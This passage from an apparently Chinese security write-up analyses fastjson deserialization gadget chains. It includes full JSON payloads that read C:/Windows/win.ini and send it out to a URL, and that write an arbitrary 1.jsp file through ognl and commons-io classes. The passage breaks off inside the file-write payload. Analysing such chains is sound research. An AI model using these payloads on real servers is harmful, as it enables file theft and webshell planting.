<p>这里调用Locale的构造函数，传language和country，并封装成BaseLocale类型赋值给baseLocale属性</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241052664.png" alt="image-20230324105234862"></p>
<p>在country里，会调用BasicCompilationUnit的构造函数，传递fileName参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;@type&quot;: &quot;java.lang.String&quot; &#123;</span><br><span class="line">										&quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">										&quot;val&quot;: &#123;</span><br><span class="line">											&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONObject&quot;,</span><br><span class="line">											&#123;</span><br><span class="line">												&quot;@type&quot;: &quot;java.lang.String&quot;</span><br><span class="line">												&quot;@type&quot;: &quot;java.util.Locale&quot;,</span><br><span class="line">												&quot;language&quot;: &quot;http://127.0.0.1:8080/?test&quot;,</span><br><span class="line">												&quot;country&quot;: &#123;</span><br><span class="line">													&quot;@type&quot;: &quot;java.lang.String&quot; [&#123;</span><br><span class="line">														&quot;@type&quot;: &quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,</span><br><span class="line">														&quot;fileName&quot;: &quot;C:/Windows/win.ini&quot;</span><br><span class="line">													&#125;]</span><br><span class="line"></span><br><span class="line">												&#125;</span><br><span class="line">											&#125;</span><br><span class="line">										&#125;,</span><br><span class="line"></span><br><span class="line">									&#125;,</span><br></pre></td></tr></table></figure>

<p>最后将val的解析结果封装成JSONObject，这时候会调用BasicCompilationUnit的getter方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241109392.png" alt="image-20230324110910161"></p>
<p>在BasicCompilationUnit的getContents方法中读取文件，并返回字节数组，同时调用其他getter方法，将属性值不为null的封装到JSONObject中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241111991.png" alt="image-20230324111144862"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241114289.png" alt="image-20230324111429197"></p>
<p>之前说过，<code>&quot;@type&quot;: &quot;java.lang.String&quot; &#123;</code>会调用parse解析后面整个对象，然后调用toString()返回，所以会调用Locale.toString()方法返回字符串给url</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241152275.png" alt="image-20230324115223197"></p>
<p>会将baseLocale的属性使用<code>_</code>分割并组装</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241155145.png" alt="image-20230324115452200"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;su17&quot;: &#123;</span><br><span class="line">	&quot;$ref&quot;: &quot;$.su16.node.p.stream&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;su18&quot;: &#123;</span><br><span class="line">	&quot;$ref&quot;: &quot;$.su17.bOM.bytes&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h5><p><code>&quot;$ref&quot;: &quot;$.su16.node.p.stream&quot;</code>表示引用根对象下<code>su16</code>对象的<code>node</code>对象下的<code>p</code>对象下的<code>stream</code></p>
<p>对于引用来说，在DefaultJSONParser的parseObject中，当解析到引用时并不会立即解析，而是先编译然后加到任务队列</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240910463.png" alt="image-20230324091028099"></p>
<p>然后使用null作为该引用的解析结果，然后返回到外层JSON.parse中</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240911432.png" alt="image-20230324091144387"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240914842.png" alt="image-20230324091403749"></p>
<p>然后在JSON.parse中处理所有引用关系，此时开始真正解析引用类型</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240916814.png" alt="image-20230324091656739"></p>
<p>在handleRsovleTask中，遍历任务队列，解析引用类型，然后调用getObject拿到该引用类型的值</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240918222.png" alt="image-20230324091856140"></p>
<p>在getObject中比较简单，遍历所有树节点，这些树节点是提前解析好的了，已经有对应的值存储在节点里，然后判断该引用是否跟节点相同，相同就返回节点对应的值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240920870.png" alt="image-20230324092023784"></p>
<p><code>$.su16.node.p.stream</code>的值为BOMInputStream</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240924534.png" alt="image-20230324092459474"></p>
<p>第二次解析<code>$.su17.bOM.bytes</code>由于在之前所有节点中并没有该引用，所以返回null</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240925699.png" alt="image-20230324092533815"></p>
<p>refValue为null时，会解析该封装成JSONPath，并调用eval解析</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240927068.png" alt="image-20230324092746012"></p>
<p>然后会将JSONPath分成三个属性段，第一个为su17，第二个为bOM，第三个为bytes</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240930261.png" alt="image-20230324093019199"></p>
<p>然后调用eval方法取每个属性段的值</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240931775.png" alt="image-20230324093130670"></p>
<p>然后在JSONPath.getPropertyValue方法中</p>
<p>如果currentObject是Map类型，他首先会在currentObject取属性段的值。若不是Map类型，则调用getter方法去取对应属性的值。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240937135.png" alt="image-20230324093654128"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240933705.png" alt="image-20230324093338660"></p>
<p>为什么不合在一起写成<code>&quot;$ref&quot;: &quot;$.su16.node.p.stream.bom.bytes&quot;</code>？</p>
<p>一开始从节点中找不到这个<code>$.su16.node.p.stream.bom.bytes</code>，所以refValue为null，然后调用JSONPath.eval解析该路径，JSONPath.eval会将该路径解析成一个个属性段，然后将调用属性段的eval方法将返回值给currentObject，下次循环再将currentObject进行传参调用eval方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303240954752.png" alt="image-20230324095437656"></p>
<p>所以这个路径<code>$.su16.node.p.stream.bom.bytes</code>是这样解析的</p>
<ol>
<li>$的值为Evaluation类</li>
<li>然后调用Evaluation类的getNode方法获取node(ASTMethod类)</li>
<li>然后ASTMethod类的getter方法获取p，由于p没有getter方法所以返回null</li>
<li>然后将currentObjct(null)作为参数接着执行属性段的eval方法</li>
<li>然后在JSONPath.getPropertyValue方法判断currentObjct为null，所以返回null，再赋值给currentObject</li>
<li>所以p属性段的解析结果为null，后面继续循环4-6步骤</li>
<li>最终返回currentObject为null</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;su17&quot;: &#123;</span><br><span class="line">	&quot;$ref&quot;: &quot;$.su16.node.p.stream&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;su18&quot;: &#123;</span><br><span class="line">	&quot;$ref&quot;: &quot;$.su17.bOM&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>su17拿到BOMInputStream对象，然后调用getBOM方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241142874.png" alt="image-20230324114219158"></p>
<p>调用in.read()，in为ReaderInputStream</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241143064.png" alt="image-20230324114350003"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241144727.png" alt="image-20230324114416652"></p>
<p>reader为URLReader，调用URLReader的read()方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241145545.png" alt="image-20230324114544453"></p>
<p>调用getReader方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241146940.png" alt="image-20230324114630866"></p>
<p>url封装了读取文件的结果，将url作为参数，调用Source.readFully()方法</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202303241147819.png" alt="image-20230324114741741"></p>
<p>发起请求，将读取的文件外带</p>
<h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><h4 id="使用ognl库配合commons-io库"><a href="#使用ognl库配合commons-io库" class="headerlink" title="使用ognl库配合commons-io库"></a>使用ognl库配合commons-io库</h4><p>这条链配合了commons-io那条链（XmlStreamReader链来完成文件读写操作）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">   <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;su14&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlException&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;su15&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlException&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;_evaluation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;su16&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.Evaluation&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.ASTMethod&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlParser&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.CharSequenceReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;charSequence&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.String&quot;</span><span class="string">&quot;aa大于8192个字符&quot;</span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span><span class="number">1024</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">           <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.jsp&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">							<span class="number">36</span><span class="punctuation">,</span><span class="number">82</span></span><br><span class="line">						<span class="punctuation">]</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;su17&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.Evaluation&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.ASTMethod&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlParser&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su16.node.p.stream.delegate.reader.is.input&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su16.node.p.stream.delegate.reader.is.branch&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">							<span class="number">36</span><span class="punctuation">,</span><span class="number">82</span></span><br><span class="line">						<span class="punctuation">]</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;su18&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.Evaluation&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.ASTMethod&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlParser&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su16.node.p.stream.delegate.reader.is.input&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su16.node.p.stream.delegate.reader.is.branch&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;boms&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.ByteOrderMark&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">							<span class="number">36</span><span class="punctuation">,</span><span class="number">82</span></span><br><span class="line">						<span class="punctuation">]</span></span><br><span class="line">					<span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">				<span class="punctuation">&#125;</span></span><br><span class="line">			<span class="punctuation">&#125;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;su19&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.Evaluation&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;node&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.ASTMethod&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;p&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">				<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ognl.OgnlParser&quot;</span><span class="punctuation">,</span></span><br><span class="line">				<span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">					<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.BOMInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">					<span class="attr">&quot;delegate&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">						<span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">						<span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;is&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su16.node.p.stream.delegate.reader.is.input&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.su16.node.p.stream.delegate.reader.is.branch&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">       <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">     <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span><span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">     <span 